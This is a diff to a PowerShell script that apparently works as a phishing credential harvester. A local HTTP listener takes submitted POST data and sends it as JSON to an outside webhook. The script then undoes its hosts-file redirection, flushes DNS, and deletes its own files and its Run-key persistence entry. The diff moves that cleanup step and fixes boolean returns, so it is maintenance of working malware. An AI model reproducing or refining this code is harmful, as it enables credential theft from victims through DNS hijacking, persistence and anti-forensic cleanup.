@@ -13,7 +13,7 @@ function Handle-Request{
         $context.Response.ContentLength64 = $buffer.length;
         $context.Response.OutputStream.Write($buffer, 0, $buffer.length);
         $context.Response.Close(); 
-        return false;   
+        return $False;   
     }
 
     if ($context.Request.HttpMethod -eq 'POST' -and $context.Request.RawUrl -eq '/') {
@@ -22,9 +22,6 @@ function Handle-Request{
         } | ConvertTo-Json;
         
         Invoke-RestMethod -ContentType 'Application/Json' -Uri $hook  -Method Post -Body $data | Wait-Process;
-
-        (Get-Content C:\Windows\System32\Drivers\etc\hosts | Select-String -pattern $hostString -notmatch) | Set-Content C:\Windows\System32\Drivers\etc\hosts;
-        ipconfig /flushdns;
 
         $buffer = [Text.Encoding]::UTF8.GetBytes("");
         $context.Response.Headers.Add("Content-Type","text/plain");
@@ -35,7 +32,7 @@ function Handle-Request{
 
         $listener.Stop();
         
-        return true;
+        return $True;
     }
 }
 
@@ -67,7 +64,10 @@ $http.Start();
 while ($http.IsListening) {
     $caught = Handle-Request $http;
     
-    if($caught){
+    if($caught){        
+        (Get-Content C:\Windows\System32\Drivers\etc\hosts | Select-String -pattern $hostString -notmatch) | Set-Content C:\Windows\System32\Drivers\etc\hosts;
+        ipconfig /flushdns;
+
         Remove-Item "$env:temp\gph.ps1" -Force;
         Remove-Item "$env:temp\gph.html" -Force;
         Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "gph" -Force
